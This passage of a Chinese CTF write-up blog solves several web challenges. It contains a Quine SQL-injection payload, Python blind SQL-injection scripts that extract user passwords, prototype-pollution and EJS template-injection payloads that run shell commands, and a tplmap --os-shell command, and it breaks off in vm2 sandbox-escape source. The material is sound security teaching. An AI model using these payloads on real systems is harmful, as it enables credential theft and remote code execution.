<code>sql</code>  注入中</p>\n<p>首先时间盲注发现这是一个空表</p>\n<p>时间盲注可以看看这篇:<a href=\"https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/\"> 来呀</a></p>\n<h4 id=\"quine注入\"><a class=\"markdownIt-Anchor\" href=\"#quine注入\">#</a> Quine 注入</h4>\n<h5 id=\"replace函数\"><a class=\"markdownIt-Anchor\" href=\"#replace函数\">#</a> replace () 函数</h5>\n<p>replace(object,search,replace)<br>\n 把 object 对象中出现的 search 全部替换成 replac, 然后返回替换后的结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(&quot;.&quot;,char(46),&quot;.&quot;);</span><br><span class=\"line\">这里的char(46)等于.</span><br><span class=\"line\">将&quot;.&quot;里的.换成.并返回替换的结果.</span><br><span class=\"line\"></span><br><span class=\"line\">select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class=\"line\">结果为:</span><br><span class=\"line\">replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">replace(‘replace(&quot;.&quot;,char(46),&quot;.&quot;)’,char(46),‘replace(&quot;.&quot;,char(46),&quot;.&quot;)’)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">replace(“replace(”.&quot;,char(46),&quot;.&quot;)&quot;,char(46),“replace(”.&quot;,char(46),&quot;.&quot;)&quot;)</td>\n</tr>\n</tbody>\n</table>\n<p>原因：第三个参数把第一个参数的。换成 replace (&quot;.&quot;,char (46),&quot;.&quot;)<br>\n 但是此时变成了双引号，我们换成单引号才能保证输入输出一样，char (34) 为 &quot; char (46) 为’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39)),char(46),&quot;.&quot;);</span><br><span class=\"line\">将&quot;.&quot;的&quot;换成&#x27;,然后将.换成.</span><br><span class=\"line\">结果是:&#x27;.&#x27;</span><br><span class=\"line\">那么就可以这样构造:</span><br></pre></td></tr></table></figure>\n<p>最终:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>\n<p>过程：看最外面的 replace 函数<br>\n replace (‘replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;)’,char (34),char (39)) 里面的 char (46) 也就是。换成 replace (replace (&quot;.&quot;,char (34),char (39)),char (46),&quot;.&quot;) 就是:</p>\n<p>replace(‘replace(replace(“replace(replace(”.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;,char(34),char(39)),char(46),“replace(replace(”.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&quot;)’,char(34),char(39))</p>\n<p>然后就是把 replace (replace (“replace (replace (”.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;,char (34),char (39)),char (46),“replace (replace (”.&quot;,char (34),char (39)),char (46),&quot;.&quot;)&quot;) 里面的 char (34) 也就是双引号换成 char (39) 单引号，就是:</p>\n<p>replace(replace(‘replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)’,char(34),char(39)),char(46),‘replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)’)<br>\n 就变回了原样</p>\n<h5 id=\"quine基本形式\"><a class=\"markdownIt-Anchor\" href=\"#quine基本形式\">#</a> Quine 基本形式</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure>\n<p>那么 str 基本形式:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;union/**/select/**/replace(replace(&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>\n<h3 id=\"26hznuctf-2023-preliminaryezlogin\"><a class=\"markdownIt-Anchor\" href=\"#26hznuctf-2023-preliminaryezlogin\">#</a> 26.[HZNUCTF 2023 preliminary]ezlogin</h3>\n<p>查看源代码发现这个注释:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">$username = strrev(base64_decode($_POST[&#x27;username&#x27;]));</span></span><br><span class=\"line\"><span class=\"comment\">$username = preg_replace(&#x27;/select|union|and|database/&#x27;, &quot;hznuctf2023&quot;, $username);--&gt;</span></span><br></pre></td></tr></table></figure>\n<p>写段 php 来测试页面</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&quot;1&#x27;||if(1,sleep(5),1)#&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">strrev</span>(<span class=\"variable\">$b</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"comment\">/*1||if(1,sleep(5),1)#</span></span><br><span class=\"line\"><span class=\"comment\">判断出单引号闭合</span></span><br><span class=\"line\"><span class=\"comment\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>过滤了 +, 空格，=,<br>\n 注释用 #,= 用 like, 空格用 <code>/**/</code>  时间盲注脚本改下参数即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"keyword\">import</span> datetime  </span><br><span class=\"line\">  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100</span>):  <span class=\"comment\">#这里其实是33到100,注意i是截取的范围</span></span><br><span class=\"line\">low = <span class=\"number\">32</span>  </span><br><span class=\"line\">high = <span class=\"number\">130</span>  </span><br><span class=\"line\">mid = (high + low) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">while</span> (low &lt; high):  </span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/DATABASE()/**/AND/**/table_name/**/like/**/&#x27;user&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(&#x27;username&#x27;,&#x27;^&#x27;,password)/**/from/**/users.user),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\">payload = payload.<span class=\"built_in\">format</span>(i, mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)  </span><br><span class=\"line\">payload = base64.b64encode(payload[::-<span class=\"number\">1</span>].encode(<span class=\"string\">&quot;utf-8&quot;</span>))  </span><br><span class=\"line\">data = &#123;  </span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span>:payload,  </span><br><span class=\"line\"><span class=\"string\">&#x27;passwd&#x27;</span>:<span class=\"string\">&#x27;1&#x27;</span>  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">time1 = datetime.datetime.now()  </span><br><span class=\"line\">r = requests.post(url, data)  </span><br><span class=\"line\">time2 = datetime.datetime.now()  </span><br><span class=\"line\">time = (time2 - time1).seconds  </span><br><span class=\"line\"><span class=\"keyword\">if</span> time &gt; <span class=\"number\">1</span>:  </span><br><span class=\"line\">low = mid + <span class=\"number\">1</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\">high = mid  </span><br><span class=\"line\">mid = (low + high) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (mid == <span class=\"number\">32</span> <span class=\"keyword\">or</span> mid == <span class=\"number\">130</span>):  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\">flag += <span class=\"built_in\">chr</span>(mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>假如我们知道成功时会返回 success, 那么此题还可以用布尔盲注 (时间更快，优先考虑)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"comment\">#请求网络界面就要调用  </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sql</span>(<span class=\"params\">url</span>):  </span><br><span class=\"line\">flag=<span class=\"string\">&#x27;&#x27;</span>  </span><br><span class=\"line\"><span class=\"comment\">#pay=&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;#&quot;  </span></span><br><span class=\"line\">pay=<span class=\"string\">&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span><span class=\"comment\">#根据实际情况更改  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>,<span class=\"number\">100</span>):<span class=\"comment\">#这里的i就是可显示字符的范围  </span></span><br><span class=\"line\">left = <span class=\"number\">32</span>  </span><br><span class=\"line\">right = <span class=\"number\">126</span>  </span><br><span class=\"line\">mid = (left + right) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">while</span> (left&lt;right):  </span><br><span class=\"line\">payload = pay.<span class=\"built_in\">format</span>(i, mid) <span class=\"comment\"># 这两个参数分别放到中括号  </span></span><br><span class=\"line\">data = &#123;  </span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span>: base64.b64encode(payload[::-<span class=\"number\">1</span>].encode()),  </span><br><span class=\"line\"><span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;1&#x27;</span>  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">r = requests.post(url, data=data)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;success&#x27;</span> <span class=\"keyword\">in</span> r.text:<span class=\"comment\">#这里的success就是正确返回的内容  </span></span><br><span class=\"line\">left=mid+<span class=\"number\">1</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\">right=mid  </span><br><span class=\"line\">mid=(left+right)//<span class=\"number\">2</span>  </span><br><span class=\"line\">flag+=<span class=\"built_in\">chr</span>(mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:  </span><br><span class=\"line\">sql(<span class=\"string\">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"27hgame-2023-week1guess-who-i-am\"><a class=\"markdownIt-Anchor\" href=\"#27hgame-2023-week1guess-who-i-am\">#</a> 27.[HGAME 2023 week1]Guess Who I Am</h3>\n<p>此题源代码有提示一个:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BvdGF0MDAwMC9WaWRhci1XZWJzaXRlL2Jsb2IvbWFzdGVyL3NyYy9zY3JpcHRzL2NvbmZpZy9tZW1iZXIuanM=\"> 网址</span><br>\n不难看出此题要求根据内容找到成员名字提交正确 100 次即可，但是那些特征却不在源代码中。因为那是 js 动态生成的<br>\n思路：爬取标签内容 -&gt; 找到 json 数据中对应的成员 -&gt; 提交给网页<br>\n<a href=\"\">爬取 js 动态数据可以看这篇</a><br>\n exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\">  </span><br><span class=\"line\">host = <span class=\"string\">&quot;http://node2.anna.nssctf.cn:28018/&quot;</span>  </span><br><span class=\"line\">getQ = host + <span class=\"string\">&quot;api/getQuestion&quot;</span>  </span><br><span class=\"line\">getS = host + <span class=\"string\">&quot;api/getScore&quot;</span>  </span><br><span class=\"line\">postA = host + <span class=\"string\">&quot;api/verifyAnswer&quot;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 打开文本,这里是从HINT给的那个网站上复制下来的，然后做了手工处理方便后续代码执行，  </span></span><br><span class=\"line\"><span class=\"comment\">#一是把最外层的方括号和那串字符去掉了，二是把最后一个花括号去掉了，三是把avatar的值有require的把他处理成双引号包含的字符，因为字典没有长这样的  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">r&quot;C:\\Users\\30779\\Desktop\\1.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">data = f.read() <span class=\"comment\"># 读取文本  </span></span><br><span class=\"line\">members = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, data.split(<span class=\"string\">&#x27;&#125;,&#x27;</span>)))  </span><br><span class=\"line\">  </span><br><span class=\"line\">session = requests.session() <span class=\"comment\"># 保持会话，避免每次请求Cookie不同  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">101</span>):  </span><br><span class=\"line\">Q = json.loads(session.get(getQ).text)[<span class=\"string\">&#x27;message&#x27;</span>] <span class=\"comment\"># 将获取到的json数据转换成字典  </span></span><br><span class=\"line\">S = json.loads(session.get(getS).text)[<span class=\"string\">&#x27;message&#x27;</span>]  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;您要回答的问题 &#x27;</span>+Q)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;您现在的分数为 &#x27;</span>+<span class=\"built_in\">str</span>(S))  </span><br><span class=\"line\"><span class=\"keyword\">for</span> member <span class=\"keyword\">in</span> members:  </span><br><span class=\"line\">member += <span class=\"string\">&#x27;&#125;&#x27;</span>  </span><br><span class=\"line\">dic = json.loads(member)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> dic[<span class=\"string\">&#x27;intro&#x27;</span>] == Q:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;恭喜你找到了 &#x27;</span>+dic[<span class=\"string\">&#x27;id&#x27;</span>])  </span><br><span class=\"line\">session.post(postA, data=&#123;<span class=\"string\">&#x27;id&#x27;</span>: dic[<span class=\"string\">&#x27;id&#x27;</span>]&#125;)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"28hgame-2023-week4shared-diary\"><a class=\"markdownIt-Anchor\" href=\"#28hgame-2023-week4shared-diary\">#</a> 28.[HGAME 2023 week4]Shared Diary</h3>\n<p>考点：原型链污染和 ejs 模板 ssti<br>\n<a href=\"\"> 原型链污染可以看这篇</a><br>\n burp 抓包，改 Content-Type 为 application/json 用来发 json 数据<br>\n附件的源代码有 merge 函数导致原型链，过滤了 <code>__proto__</code> 要用 constructor.prototype 来绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>或者:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>这段 payload 先定义 constructor 的构造方法，利用原型对象 prototype 定义一个属性 role 值为 admin,<br>\n 然后 response 会显示一个<mark> Set-Cookie</mark> 的 session 值，告诉你这是 302 重定向用的，路径是 /<br>\n 因此我们就可以利用这个 session 登录 (username 和 password 都是 admin), 注意<mark>此时要修改路径为 /, 否则登不进去</mark></p>\n<p>进入后是一个 ejs 模板注入<br>\n <code>&#123;%-code%&#125;</code>  标签可以执行 js 代码，此题无过滤<br>\n步骤跟之前一样，改 session,<mark> 换路径为 /</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure>\n<p>payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%- process.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;).toString() %&gt;</span><br></pre></td></tr></table></figure>\n<p>tplmap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python tplmap.py -u http://node2.anna.nssctf.cn:28131/ -d diary=1 -c session=s%3AevnNci_FQ3mbuQ53FJAkHIG1q_3Cmzf7.7MN5h%2F6huxvKTZFAUDFvPi%2FS0s8i53HTpqqutPLTp1U -e ejs --os-shell</span><br></pre></td></tr></table></figure>\n<h3 id=\"29hznuctf-2023-finaleznode\"><a class=\"markdownIt-Anchor\" href=\"#29hznuctf-2023-finaleznode\">#</a> 29.[HZNUCTF 2023 final]eznode</h3>\n<p>此题要学习 VM2 和 VM2 沙箱逃逸，可以看看这篇<a href=\"\"> VM 沙箱逃逸</a><br>\n app.js 看源码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"variable constant_\">VM</span> &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm2&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(express.<span class=\"title function_\">json</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> backdoor = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title function_\">VM</span>().<span class=\"title function_\">run</span>(&#123;&#125;.<span class=\"property\">shellcode</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class=\"property\">constructor</span> &amp;&amp; obj.<span class=\"property\">constructor</span> === <span class=\"title class_\">Object</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">merge</span> = (<span class=\"params\">a, b</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> attr <span class=\"keyword\">in</span> b) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_\">isObject</span>(a[attr]) &amp;&amp; <span class=\"title function_\">isObject</span>(b[attr])) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">merge</span>(a[attr], b[attr]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            a[attr] = b[attr];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">clone</span> = (<span class=\"params\">a</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">merge</span>(&#123;&#125;, a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title 